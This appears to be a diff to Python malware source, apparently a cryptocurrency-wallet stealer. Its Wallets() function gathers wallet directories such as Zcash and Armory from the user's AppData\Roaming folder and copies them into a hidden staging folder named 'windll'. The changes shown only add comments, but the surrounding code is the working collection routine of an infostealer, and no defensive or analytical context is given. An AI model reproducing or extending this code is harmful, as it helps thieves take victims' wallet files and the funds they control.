@@ -19,6 +19,9 @@ def Wallets():
         print("w")
         pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
         pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        """
+        all needed paths
+        """
         wallets = [
         rf"\Zcash",
         rf"\Armory",
@@ -38,12 +41,12 @@ def Wallets():
                 try:
                     if (i != 3 and i != 7 and i != 8):
                         #print(wallets[i],"  if")
-                        shutil.copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")
+                        shutil.copytree(rf"{pathtofile}{wallets[i]}",rf"{pathtofolder}\windll\wallets{wallets[i]}")# copy dirs
                     else:
                         #print(wallets[i],"  else")
                         num = wallets[i].rfind("\\")
                         #print(wallets[i][:num+1])
-                        shutil.copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}") 
+                        shutil.copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}")# copy dirs
                 except Exception as e:
                     print(e)
         except Exception as e:
